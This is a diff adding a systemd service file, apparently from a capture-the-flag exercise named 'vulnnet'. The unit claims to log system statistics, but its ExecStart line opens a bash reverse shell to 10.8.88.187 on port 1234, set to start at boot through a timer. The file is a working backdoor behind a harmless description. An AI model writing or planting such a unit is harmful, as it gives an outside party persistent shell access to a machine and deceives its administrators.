@@ -1,0 +1,12 @@
+[Unit]
+Description=Logs system statistics to the systemdjournal 
+Wants=vulnnet-auto.timer
+
+[Service]
+# Gather system statistics
+Type=forking
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.88.187/1234 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
